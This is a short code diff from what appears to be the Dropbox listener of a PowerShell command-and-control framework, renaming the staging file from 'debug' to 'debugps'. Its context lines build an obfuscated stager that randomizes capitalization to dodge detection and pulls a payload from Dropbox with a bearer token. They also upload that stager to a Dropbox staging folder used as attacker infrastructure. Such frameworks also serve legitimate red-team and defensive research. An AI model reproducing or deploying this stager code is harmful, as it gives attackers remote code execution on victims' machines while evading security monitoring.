@@ -219,7 +219,7 @@ class Listener:
                 stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                 stager += "\"Authorization\",\"Bearer $t\");"
                 stager += helpers.randomize_capitalization("$wc.Headers.Add(")
-                stager += "\"Dropbox-API-Arg\",'{\"path\":\"%s/debug\"}');" % (stagingFolder)
+                stager += "\"Dropbox-API-Arg\",'{\"path\":\"%s/debugps\"}');" % (stagingFolder)
 
                 stager += helpers.randomize_capitalization("$data=$WC.DownloadData('")
                 stager += "https://content.dropboxapi.com/2/files/download');"
@@ -573,8 +573,8 @@ class Listener:
         stagerCode = self.generate_stager(listenerOptions=listenerOptions, language='powershell')
         try:
             # delete stager if it exists
-            delete_file(dbx, "%s/debug" % (stagingFolder))
-            dbx.files_upload(stagerCode, "%s/debug" % (stagingFolder))
+            delete_file(dbx, "%s/debugps" % (stagingFolder))
+            dbx.files_upload(stagerCode, "%s/debugps" % (stagingFolder))
         except dropbox.exceptions.ApiError:
             print helpers.color("[!] Error uploading stager to '%s/stager'" % (stagingFolder))
             return
